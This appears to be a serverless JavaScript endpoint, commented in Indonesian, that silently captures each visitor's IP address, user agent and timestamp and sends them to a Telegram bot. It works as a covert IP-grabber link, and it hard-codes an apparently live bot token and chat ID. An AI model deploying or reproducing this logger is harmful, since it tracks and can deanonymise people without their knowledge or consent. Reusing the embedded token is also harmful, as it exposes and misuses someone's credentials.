export default async function handler(req, res) {
  // Token & Chat ID langsung ditulis
  const token = "8427844482:AAHHXCP_psaehlBnm8SHBEEFvhTehYw2gEY";
  const chatId = "7600526426";

  // Ambil data dari request
  const ip =
    req.headers["x-forwarded-for"]?.split(",")[0] ||
    req.connection?.remoteAddress ||
    "unknown";
  const ua = req.headers["user-agent"] || "unknown";
  const time = new Date().toLocaleString("id-ID", { timeZone: "Asia/Jakarta" });

  // Format pesan
  const text = `
🔎 *IP Terdeteksi!*
📍 IP: ${ip}
🌐 User-Agent: ${ua}
🕒 Waktu: ${time}
`;

  // Kirim ke Telegram
  try {
    const send = await fetch(
      `https://api.telegram.org/bot${token}/sendMessage`,
      {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          chat_id: chatId,
          text,
          parse_mode: "Markdown",
        }),
      }
    );

    const result = await send.json();
    console.log("Telegram Response:", result);

    res.status(200).json({ success: true, sent: result });
  } catch (err) {
    console.error(err);
    res.status(500).json({ success: false, error: err.message });
  }
}
